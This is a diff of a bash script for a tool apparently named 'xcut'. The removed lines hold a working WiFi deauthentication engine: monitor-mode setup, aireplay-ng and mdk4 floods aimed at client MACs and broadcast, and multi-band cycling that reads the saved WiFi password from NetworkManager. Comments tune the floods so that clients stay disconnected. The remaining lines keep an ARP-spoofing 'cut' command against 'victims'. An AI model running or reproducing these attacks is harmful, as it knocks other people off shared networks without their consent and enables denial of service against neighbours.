-        # managed-mode scan clears No IR / Disabled channel flags on iwlwifi
-        timeout 10 iw dev "$DEV" scan >/dev/null 2>&1 || true
-        if [ "$MONIF" = "xcutmon" ]; then
-            ip link set "$MONIF" up 2>/dev/null
-            echo "  adaptive: $DEV is iwlwifi - monitor sub-interface $MONIF (your WiFi stays connected)"
-        else
-            ip link set "$DEV" down 2>/dev/null
-            for _ in 1 2 3; do
-                iw dev "$DEV" set type monitor 2>/dev/null && break
-                sleep 1
-            done
-            ip link set "$DEV" up 2>/dev/null
-        fi
-    else
-        ip link set "$DEV" down 2>/dev/null
-        for _ in 1 2 3; do
-            iw dev "$DEV" set type monitor 2>/dev/null && break
-            sleep 1
-        done
-        ip link set "$DEV" up 2>/dev/null
-    fi
-    sleep 1
-
-    # ---- verify monitor mode: abort loudly instead of failing silently ----
-    type="$(iw dev "$MONIF" info 2>/dev/null | awk '/type/{print $2; exit}')"
-    if [ "$type" != "monitor" ]; then
-        echo "  ERROR: $MONIF did not enter monitor mode (state: ${type:-unknown})." >&2
-        echo "         iwlwifi 5GHz often refuses to switch - you need a USB adapter" >&2
-        echo "         with injection support (Realtek RTL8812AU / mt76)." >&2
-        deauth_stop
-        exit 1
-    fi
-    ip link set "$MONIF" up 2>/dev/null
-    state="$(ip -br link show "$MONIF" 2>/dev/null | awk '{print $2}')"
-    # monitor-mode ifaces often report UNKNOWN (no carrier) - that's fine;
-    # only a DOWN/absent link means we cannot inject.
-    if [ -z "$state" ] || [ "$state" = "DOWN" ]; then
-        echo "  ERROR: $MONIF is not up (state: ${state:-unknown}) - cannot inject frames." >&2
-        deauth_stop
-        exit 1
-    fi
-
-    # ---- make sure we transmit on the AP's channel ----
-    if [ -z "$hoplist" ] && [ -n "$ch" ]; then
-        cur="$(iw dev "$MONIF" info 2>/dev/null | awk '/channel/{print $2; exit}')"
-        if [ "$cur" != "$ch" ]; then
-            iw dev "$MONIF" set channel "$ch" >/dev/null 2>&1
-            sleep 0.5
-            cur="$(iw dev "$MONIF" info 2>/dev/null | awk '/channel/{print $2; exit}')"
-        fi
-        # abort only on positive evidence of a wrong channel; a missing channel
-        # report ("-1"/empty) is covered by aireplay's --ignore-negative-one.
-        if [ -n "$cur" ] && [ "$cur" != "$ch" ]; then
-            echo "  ERROR: $MONIF is on channel $cur but the AP is on channel $ch." >&2
-            echo "         deauth frames on the wrong channel are ignored by clients." >&2
-            echo "         fix with:  iw dev $MONIF set channel $ch" >&2
-            deauth_stop
-            exit 1
-        fi
-        echo "  deauth channel ${cur:-$ch} via $MONIF"
-    elif [ -z "$hoplist" ]; then
-        # channel unknown: try to locate the AP from monitor mode
-        sleep 2
-        freq="$(iw dev "$MONIF" scan 2>/dev/null | awk -v a="$apmac" '
-            $1=="BSS" && $2==a {seen=1}
-            seen && /freq:/ {print $2; exit}')"
-        ch="$(freq2ch "$freq")"
-        if [ -n "$ch" ]; then
-            iw dev "$MONIF" set channel "$ch" 2>/dev/null
-            echo "  deauth channel $ch via $MONIF"
-        elif [ "$MONIF" != "xcutmon" ]; then
-            echo "  ERROR: could not determine the AP channel from $MONIF." >&2
-            echo "         set it manually, then re-run:  iw dev $MONIF set channel <ch>" >&2
-            deauth_stop
-            exit 1
-        fi
-    fi
-
-    # The aireplay -9 injection test is pointless on iwlwifi (always
-    # inconclusive - RX warms up slowly) AND its probe TX can itself crash
-    # the AX201 firmware. Only run it on non-iwlwifi cards where it works.
-    if [ "$driver" != "iwlwifi" ] && command -v aireplay-ng >/dev/null 2>&1; then
-        echo "  checking packet injection (informational, up to 20s) ..."
-        if timeout 20 aireplay-ng --ignore-negative-one -9 -a "$apmac" "$MONIF" 2>&1 | tee -a "$CACHE_DIR/deauth.log" | grep -q "Injection is working"; then
-            echo "  injection OK - card is transmitting."
-        else
-            echo "  injection check inconclusive - verify on another device that clients disconnect."
-        fi
-    else
-        echo "  (injection check skipped - iwlwifi or aireplay-ng not installed)"
-    fi
-
-    # --ignore-negative-one is required on drivers that report channel -1
-    # (iwlwifi/ath) or aireplay-ng exits instantly.
-    #
-    # 'all' mode uses directed deauth (per MAC) AND broadcast deauth together.
-    # The scan-based target list mixes 2.4GHz / 5G / even wired devices, and a
-    # directed deauth only reaches stations actually on THIS channel - so
-    # directed-only runs can transmit fine yet show 0 ACKs and kick nobody.
-    # Broadcast deauth needs no client MAC at all: it kicks every station on
-    # the AP's channel. (Run 1 of this tool kicked devices precisely because
-    # it sent broadcast too.)
-    #
-    # iwlwifi firmware (AX200/201, kernel bugzilla 214291) CRASHES under a
-    # sustained flood: aireplay's continuous mode sends 128-frame bursts with
-    # only 180ms gaps, and the firmware dies on ~the 3rd burst. So on iwlwifi
-    # we run short single-burst deauths (--deauth 1) inside a supervisor loop
-    # with a pause between bursts - gentle enough to keep the firmware alive
-    # while still re-kicking clients as they try to re-associate. Non-iwlwifi
-    # cards (USB RTL/mt76) survive the continuous flood and hold tighter.
-    # Engine choice: aireplay directed deauth needs NO RX (it just blasts
-    # deauth spoofed from the AP to the client MAC) - proven to kick clients
-    # on this card. mdk4 must first SNIFF the AP to learn it, and iwlwifi
-    # monitor RX is unreliable, so mdk4 can silently do nothing. Default to
-    # aireplay; opt into mdk4 with:  DEAUTH_ENGINE=mdk4
-    engine="aireplay"
-    case "${DEAUTH_ENGINE:-}" in
-        ""|aireplay|mdk4) ;;
-        *) echo "  (unknown DEAUTH_ENGINE '$DEAUTH_ENGINE' - expected aireplay|mdk4, using aireplay)" ;;
-    esac
-    if [ "${DEAUTH_ENGINE:-}" = "mdk4" ] && command -v mdk4 >/dev/null 2>&1; then
-        engine="mdk4"
-    elif [ "${DEAUTH_ENGINE:-}" = "mdk4" ]; then
-        echo "  (DEAUTH_ENGINE=mdk4 requested but mdk4 is not installed - using aireplay)"
-    fi
-    rate="${MDK4_RATE:-50}"  # mdk4 only: total packets/second
-    gap="${DEAUTH_GAP:-2}"   # aireplay iwlwifi: seconds between bursts
-    [ "$gap" -lt 1 ] 2>/dev/null && gap=1
-    # frames per burst: 1 frame is routinely IGNORED by clients (verified:
-    # a single/5-frame directed deauth does nothing; 10+ kicks within a
-    # second). 128-frame continuous bursts crash iwlwifi firmware, so burst
-    # 10 and pause.
-    burst="${DEAUTH_BURST:-10}"
-    bcast=0
-    # driver TX packet count - proves frames actually leave the driver.
-    # NOTE: on iwlwifi the monitor sub-interface (xcutmon) reports 0 TX
-    # while frames are transmitted through the PARENT interface (wlan0),
-    # so sum both to get the real number.
-    tx_total() {  # -> driver TX packets across MONIF (+ parent)
-        local a b
-        a="$(ip -s link show "$MONIF" 2>/dev/null | awk '/^ *TX:/{getline; print $2}')"
-        b=0
-        if [ "$MONIF" != "$DEV" ]; then
-            b="$(ip -s link show "$DEV" 2>/dev/null | awk '/^ *TX:/{getline; print $2}')"
-        fi
-        echo "$(( ${a:-0} + ${b:-0} ))"
-    }
-    tx0="$(tx_total)"
-    if [ "$engine" = "mdk4" ]; then
-        blist="$CACHE_DIR/deauth.blist"
-        : > "$blist"
-        for m in $macs; do
-            [ -z "$m" ] && continue
-            echo "$m" >> "$blist"
-            echo "$m" >> "$CACHE_DIR/deauth.list"
-        done
-        mdk4 "$MONIF" d -b "$blist" -a "$apmac" -s "$rate" >>"$CACHE_DIR/deauth.log" 2>&1 &
-        echo $! >> "$CACHE_DIR/deauth.pids"
-        echo "  deauth engine: mdk4 ($(wc -l < "$blist" | tr -d ' ') clients @ ${rate} pps)"
-    else
-        require_aireplay
-        if [ -n "$hoplist" ]; then
-            # multi-band worker: hop between the sibling APs' channels and
-            # burst deauth at each one. All client MACs are fired at every
-            # AP (wrong-band deauths are silently ignored; broadcast covers
-            # everything else on that channel).
-            echo "  deauth engine: aireplay-ng (channel-hop, $(echo "$hoplist" | wc -l) APs)"
-            (
-                while :; do
-                    while read -r hb hc; do
-                        [ -n "$hb" ] || continue
-                        iw dev "$MONIF" set channel "$hc" >>"$CACHE_DIR/deauth.log" 2>&1
-                        sleep 0.5
-                        for m in $macs; do
-                            [ -z "$m" ] && continue
-                            aireplay-ng --ignore-negative-one -D --deauth "$burst" -a "$hb" -c "$m" "$MONIF" >>"$CACHE_DIR/deauth.log" 2>&1
-                            sleep "$gap"
-                        done
-                        # broadcast deauth covers every station on this channel
-                        aireplay-ng --ignore-negative-one -D --deauth "$burst" -a "$hb" "$MONIF" >>"$CACHE_DIR/deauth.log" 2>&1
-                        sleep "$gap"
-                    done <<< "$hoplist"
-                done
-            ) &
-            echo $! >> "$CACHE_DIR/deauth.pids"
-            for m in $macs; do
-                [ -z "$m" ] && continue
-                echo "$m" >> "$CACHE_DIR/deauth.list"
-            done
-            bcast=1
-        elif [ "$driver" = "iwlwifi" ]; then
-            if [ "$mon_mode" = "main" ] && [ "${DEAUTH_GENTLE:-0}" != "1" ]; then
-                # main-interface monitor + CONTINUOUS flood = the configuration
-                # that used to kick devices reliably on this card (the earlier
-                # firmware crash was caused by multi-band channel-hopping, which
-                # is off by default now). Bursts with pauses let clients
-                # re-associate in the gap - that's why nothing stayed kicked.
-                # 'all' floods broadcast only: one continuous flood, light on
-                # the firmware, and it kicks every station on the channel.
-                # DEAUTH_GENTLE=1 falls back to the burst loop below.
-                echo "  deauth engine: aireplay-ng (continuous flood)"
-                if [ "$1" = "all" ]; then
-                    aireplay-ng --ignore-negative-one -D --deauth 0 -a "$apmac" "$MONIF" >>"$CACHE_DIR/deauth.log" 2>&1 &
-                    echo $! >> "$CACHE_DIR/deauth.pids"
-                    bcast=1
-                else
-                    for m in $macs; do
-                        [ -z "$m" ] && continue
-                        aireplay-ng --ignore-negative-one -D --deauth 0 -a "$apmac" -c "$m" "$MONIF" >>"$CACHE_DIR/deauth.log" 2>&1 &
-                        echo $! >> "$CACHE_DIR/deauth.pids"
-                        echo "$m" >> "$CACHE_DIR/deauth.list"
-                    done
-                fi
-            else
-                echo "  deauth engine: aireplay-ng (burst loop - gentle)"
-                # gentle fallback (DEAUTH_GENTLE=1 or sub-interface mode):
-                # iwlwifi firmware (AX200/201, kernel bugzilla 214291) can
-                # crash under a sustained flood, so run short single-burst
-                # deauths inside a supervisor loop with a pause between bursts.
-                # Note: clients that re-associate fast can slip back in between
-                # bursts - flood (default) holds them off harder.
-                for m in $macs; do
-                    [ -z "$m" ] && continue
-                    (
-                        while true; do
-                            aireplay-ng --ignore-negative-one -D --deauth "$burst" -a "$apmac" -c "$m" "$MONIF" >>"$CACHE_DIR/deauth.log" 2>&1
-                            sleep "$gap"
-                        done
-                    ) &
-                    echo $! >> "$CACHE_DIR/deauth.pids"
-                    echo "$m" >> "$CACHE_DIR/deauth.list"
-                    sleep 0.5   # smooth the launch so the first bursts don't pile up
-                done
-                # broadcast deauth worker (all mode only): no client MAC needed,
-                # kicks EVERY station on the AP's channel - including devices the
-                # ARP scan could not match to this band. (broadcast frames are
-                # never ACKed by design, so its log lines show no ACKs - fine.)
-                if [ "$1" = "all" ]; then
-                    (
-                        while true; do
-                            aireplay-ng --ignore-negative-one -D --deauth "$burst" -a "$apmac" "$MONIF" >>"$CACHE_DIR/deauth.log" 2>&1
-                            sleep "$gap"
-                        done
-                    ) &
-                    echo $! >> "$CACHE_DIR/deauth.pids"
-                    bcast=1
-                fi
-            fi
-        else
-            echo "  deauth engine: aireplay-ng (continuous)"
-            # non-iwlwifi cards (USB RTL/mt76) survive the continuous flood
-            for m in $macs; do
-                [ -z "$m" ] && continue
-                aireplay-ng --ignore-negative-one -D --deauth 0 -a "$apmac" -c "$m" "$MONIF" >>"$CACHE_DIR/deauth.log" 2>&1 &
-                echo $! >> "$CACHE_DIR/deauth.pids"
-                echo "$m" >> "$CACHE_DIR/deauth.list"
-            done
-            if [ "$1" = "all" ]; then
-                aireplay-ng --ignore-negative-one -D --deauth 0 -a "$apmac" "$MONIF" >>"$CACHE_DIR/deauth.log" 2>&1 &
-                echo $! >> "$CACHE_DIR/deauth.pids"
-                bcast=1
-            fi
-        fi
-    fi
-    sleep 1.5
-    # on iwlwifi an aireplay child may be mid-sleep between bursts, so verify
-    # the supervisor loops are alive instead of grepping for aireplay itself
-    alive=0
-    while read -r p; do kill -0 "$p" 2>/dev/null && alive=1; done < "$CACHE_DIR/deauth.pids"
-    # stay in the foreground until Ctrl+C / SIGTERM (trap at top of this
-    # function), or until another terminal ran 'xcut deauth stop' (which kills
-    # all workers) - always clean up
-    if [ "$alive" = "1" ]; then
-        n="$(wc -l < "$CACHE_DIR/deauth.list" | tr -d ' ')"
-        if [ "$engine" = "mdk4" ]; then
-            if [ "$n" = "1" ]; then
-                echo "deauth running (kicking 1 client via mdk4 @ ${rate} pps)."
-            else
-                echo "deauth running (kicking $n clients via mdk4 @ ${rate} pps)."
-            fi
-        elif [ "$1" = "all" ]; then
-            if [ -n "$hoplist" ]; then
-                echo "deauth running (channel-hop at $(echo "$hoplist" | wc -l) APs, $n clients + broadcast per AP)."
-            elif [ "$bcast" = "1" ]; then
-                if [ "$n" = "0" ]; then
-                    echo "deauth running (broadcast flood - kicking every station on this channel)."
-                else
-                    echo "deauth running (directed at $n clients + broadcast)."
-                fi
-            else
-                echo "deauth running (directed at $n clients, no broadcast - iwlwifi)."
-            fi
-        else
-            echo "deauth running (target $n MAC)."
-        fi
-        echo "  press Ctrl+C to stop (or from another terminal: xcut deauth stop)"
-        if [ -n "$hoplist" ]; then
-            echo "  hopping between $(echo "$hoplist" | wc -l) APs' channels - every station on"
-            echo "  each channel gets kicked. your own WiFi is OFF while this runs"
-            echo "  (interface is in monitor mode) and reconnects on stop."
-        elif [ "$bcast" = "1" ]; then
-            echo "  broadcast deauth active - kicking every station on this channel."
-            echo "  (broadcast frames are never ACKed - '0 ACKs' in the log is NORMAL.)"
-        fi
-        sleep 2
-        fwerr="$(new_fwerr "$base")"
-        if [ -n "$fwerr" ]; then
-            echo "  WARNING: iwlwifi firmware TX errors detected - known AX201 bug"
-            echo "           (kernel bugzilla 214291)."
-            if [ "$engine" = "mdk4" ]; then
-                echo "           if it still crashes lower the rate:  MDK4_RATE=20 xcut deauth all"
-            elif [ "${DEAUTH_GENTLE:-0}" = "1" ] || [ "$mon_mode" = "sub" ]; then
-                echo "           if it still crashes raise the gap:  DEAUTH_GAP=4 xcut deauth all"
-            else
-                echo "           if it still crashes switch to gentle bursts:  DEAUTH_GENTLE=1 xcut deauth all"
-            fi
-            echo "           or use fewer targets (xcut deauth <nr>) / a USB adapter"
-            echo "           with injection support (Realtek RTL8812AU / mt76)."
-            echo "$fwerr" | sed 's/^/    /'
-        fi
-        # show what the engine is actually doing (transmitting vs erroring)
-        if [ -s "$CACHE_DIR/deauth.log" ]; then
-            echo "  engine output:"
-            tail -3 "$CACHE_DIR/deauth.log" | sed 's/^/    /'
-        fi
-        if [ -n "$tx0" ]; then
-            tx1="$(tx_total)"
-            if [ "$(( ${tx1:-0} - tx0 ))" -gt 0 ]; then
-                echo "  driver TX packets since launch: $(( ${tx1:-0} - tx0 )) (frames leaving the card)"
-            else
-                echo "  (driver TX counter at 0 - iwlwifi often undercounts monitor TX,"
-                echo "   but on some firmware versions the monitor sub-interface"
-                echo "   really transmits nothing. if no device disconnects, re-run:"
-                echo "   DEAUTH_MON=main xcut deauth all   (your WiFi drops - this"
-                echo "   was the configuration that kicked devices before))"
-            fi
-        fi
-        # monitor loop: stay alive until stopped; report NEW firmware crashes
-        lastline="$(new_fwerr "$base" | tail -1)"
-        while :; do
-            sleep 2
-            any=0
-            while read -r p; do kill -0 "$p" 2>/dev/null && any=1; done < "$CACHE_DIR/deauth.pids" 2>/dev/null
-            [ "$any" = "1" ] || break
-            line="$(new_fwerr "$base" | tail -1)"
-            if [ -n "$line" ] && [ "$line" != "$lastline" ]; then
-                lastline="$line"
-                echo "  WARNING: iwlwifi firmware error detected - the attack may have stopped."
-                echo "           $line"
-                if [ "$engine" = "mdk4" ]; then
-                    echo "           re-run with:  MDK4_RATE=20 xcut deauth all"
-                elif [ "${DEAUTH_GENTLE:-0}" = "1" ] || [ "$mon_mode" = "sub" ]; then
-                    echo "           re-run with:  DEAUTH_GAP=4 xcut deauth all"
-                else
-                    echo "           re-run with:  DEAUTH_GENTLE=1 xcut deauth all"
-                fi
-            fi
-        done
-        echo "  deauth workers stopped - restoring interface."
-        deauth_stop
-    else
-        echo "  deauth did not start - check dmesg / injection support"
-        [ -s "$CACHE_DIR/deauth.log" ] && tail -3 "$CACHE_DIR/deauth.log"
-        echo "  test injection with: aireplay-ng --test $MONIF"
-        deauth_stop
-    fi
-}
-
-deauth_stop() {
-    local MONIF
-    if [ -s "$CACHE_DIR/deauth.pids" ]; then
-        while read -r p; do kill "$p" 2>/dev/null; done < "$CACHE_DIR/deauth.pids"
-        sleep 1
-    fi
-    pkill -f "aireplay-ng .*--deauth" 2>/dev/null
-    pkill -f "mdk4 .* d -b" 2>/dev/null
-    sleep 1
-    pkill -9 -f "aireplay-ng .*--deauth" 2>/dev/null   # orphaned burst children
-    pkill -9 -f "mdk4 .* d -b" 2>/dev/null
-    if [ -s "$STATE.deauth" ]; then
-        { read -r DEV; read -r MONIF; } < "$STATE.deauth"
-        MONIF="${MONIF:-$DEV}"
-    elif [ ! -s "$CACHE_DIR/deauth.pids" ] && ! pgrep -f "aireplay-ng .*--deauth" >/dev/null 2>&1 && ! pgrep -f "mdk4 .* d -b" >/dev/null 2>&1; then
-        # nothing left to clean - 'deauth stop' already ran in another terminal
-        echo "nothing to stop - deauth already cleaned up."
-        return
-    else
-        DEV="${DEV:-wlan0}"
-        command -v iw >/dev/null 2>&1 && DEV="$(iw dev 2>/dev/null | awk '/^[[:space:]]*Interface/{print $2; exit}')"
-        [ -n "$DEV" ] || DEV="wlan0"
-        MONIF="$DEV"
-    fi
-    [ "$MONIF" != "$DEV" ] && iw dev "$MONIF" del 2>/dev/null
-    ip link set "$DEV" down 2>/dev/null
-    iw dev "$DEV" set type managed 2>/dev/null || true
-    ip link set "$DEV" up 2>/dev/null
-    nmcli dev set "$DEV" managed on >/dev/null 2>&1 || true
-    rm -f "$CACHE_DIR/deauth.pids" "$CACHE_DIR/deauth.list" \
-          "$CACHE_DIR/deauth.blist" "$STATE.deauth"
-    echo "interface $DEV restored; Wi-Fi will re-associate now"
-    if [ -s "$CACHE_DIR/deauth.log" ]; then
-        echo "  --- last deauth engine output ---"
-        tail -5 "$CACHE_DIR/deauth.log" | sed 's/^/    /'
-        echo "  --- full log: $CACHE_DIR/deauth.log ---"
-    fi
-}
-
-# ---- sequential multi-band deauth (single-radio iwlwifi workaround) ----
-# One radio can only sit on ONE channel, and channel-hopping crashes the
-# iwlwifi firmware, so a dual-band AP's two bands can never be attacked at
-# once with the built-in card. DEAUTH_SEQ=1 handles the bands one after
-# another: reconnect wlan0 to each band's SSID (same base name, e.g.
-# "Kosan73(5G)" + "Kosan73(4G)" -> base "Kosan73"), run the normal per-band
-# flood for a while, then move to the next band and repeat. Ctrl+C stops and
-# restores your original WiFi. A USB adapter (RTL8812AU/mt76) with
-# DEAUTH_HOP=1 still does both bands simultaneously - prefer that.
-
-seq_prof_of() {             # $1 = SSID -> NM profile name ("" if none)
-    nmcli -t -f NAME,SSID connection show 2>/dev/null | awk -F: -v s="$1" '$2==s{print $1; exit}'
-}
-
-seq_join() {                # $1 = SSID; connect and wait until linked (root)
-    local p="$1" i cur
-    p="$(seq_prof_of "$1")"
-    if [ -n "$p" ]; then
-        nmcli con up "$p" >/dev/null 2>&1
-    elif [ -n "${SEQ_PSK:-}" ]; then
-        nmcli dev wifi connect "$1" ifname "$DEV" password "$SEQ_PSK" >/dev/null 2>&1
-    else
-        echo "  skip '$1': no saved NM profile and no way to join it"
-        return 1
-    fi
-    for i in $(seq 1 30); do
-        cur="$(iw dev "$DEV" link 2>/dev/null | awk '/SSID:/{print $2; exit}')"
-        [ "$cur" = "$1" ] && return 0
-        sleep 1
-    done
-    echo "  skip '$1': could not join within 30s"
-    return 1
-}
-
-seq_stop() {                # restore original WiFi profile (trap handler)
-    [ -n "${child:-}" ] && { kill "$child" 2>/dev/null; wait "$child" 2>/dev/null; }
-    if [ -n "${orig:-}" ]; then
-        echo "restoring original WiFi profile '$orig' ..."
-        nmcli con up "$orig" >/dev/null 2>&1 || true
-    fi
-}
-
-deauth_seq_run() {          # $1 = nr|ip|all ; root
-    trap 'seq_stop; exit 0' INT TERM
-    local cur base scan_all others b child seqt orig
-    cur="$(iw dev "$DEV" link 2>/dev/null | awk '/SSID:/{print $2; exit}')"
-    [ -n "$cur" ] || die "not connected to an AP - nothing to find sibling bands of"
-    base="$(echo "$cur" | sed 's/[[:space:]]*([^()]*)$//')"
-    echo "== sequential multi-band deauth on base SSID '$base' =="
-    scan_all="$(timeout 15 iw dev "$DEV" scan 2>/dev/null)"
-    others="$(echo "$scan_all" | awk '
-        function emit(){ if(s && f) print s, f }
-        /^BSS /{emit(); b=$2; sub(/\(.*/, "", b); f=""; s=""}
-        /freq:/{if(b && !f) f=$2}
-        /SSID:/{if(b && !s) s=$2}
-        END{emit()}
-    ' | awk -v base="$base" -v cur="$cur" '
-        { s=$1; sub(/[[:space:]]*\([^()]*\)$/, "", s)
-          if (s==base && $1!=cur) print $1 }' | sort -u)"
-    if [ -z "$others" ]; then
-        echo "  no sibling APs share base SSID '$base' - single band, attacking directly"
-        deauth_start "$1" "$DEV"
-        return
-    fi
-    echo "  bands: $cur + $(echo "$others" | tr '\n' ' ')"
-    seqt="${DEAUTH_SEQ_TIME:-90}"
-    echo "  cycling ${seqt}s per band; Ctrl+C stops and restores your original WiFi"
-    orig="$(seq_prof_of "$cur")"
-    if [ -n "$orig" ]; then
-        # reuse the current profile's PSK so a never-joined sibling can connect
-        SEQ_PSK="$(nmcli -s -t -f 802-11-wireless-security.psk connection show "$orig" 2>/dev/null | awk -F: '{print $2}')"
-        [ -n "$SEQ_PSK" ] || echo "  note: could not read PSK - unjoined bands will be skipped"
-    fi
-    while :; do
-        for b in $cur $others; do
-            [ -n "$b" ] || continue
-            seq_join "$b" || continue
-            echo "== attacking band '$b' (${seqt}s; own WiFi off while flooding) =="
-            deauth_start "$1" "$DEV" &
-            child=$!
-            sleep "$seqt"
-            kill "$child" 2>/dev/null
-            wait "$child" 2>/dev/null
-            child=""
-        done
-    done
-}
-
 main() {
     case "${1:-}" in
-        scan)                require_root "$@"; scan ;;
-        list)                list_hosts ;;
+        scan)                require_root "$@"; scan "${@:2}" ;;
+        list)                [ "${2:-}" = "--json" ] && list_hosts_json || list_hosts ;;
+        status)
+              if [ "${2:-}" = "--json" ]; then status_json; else cmd_status; fi ;;
         cut)  [ -n "${2:-}" ] || usage
                               require_root "$@"; require_arpspoof; get_netinfo
-                              cut_target "$2" ;;
+                              # Ctrl+C / SIGTERM in the middle of a cut-all loop
+                              # must restore every victim - no orphaned arpspoof
+                              trap 'stop_cut; exit 0' INT TERM
+                              cut_target "$2"
+                              trap - INT TERM ;;
         stop)                require_root "$@"; require_arpspoof; get_netinfo
                               stop_cut ;;
 uncut) [ -n "${2:-}" ] || usage
@@ -1121,4 +564,8 @@ uncut) [ -n "${2:-}" ] || usage
         *)                   usage ;;
     esac
 }
-main "$@"
+
+# sourced by tests (bats) to reach the functions without running main()
+if [ "${BASH_SOURCE[0]}" = "$0" ]; then
+    main "$@"
+fi
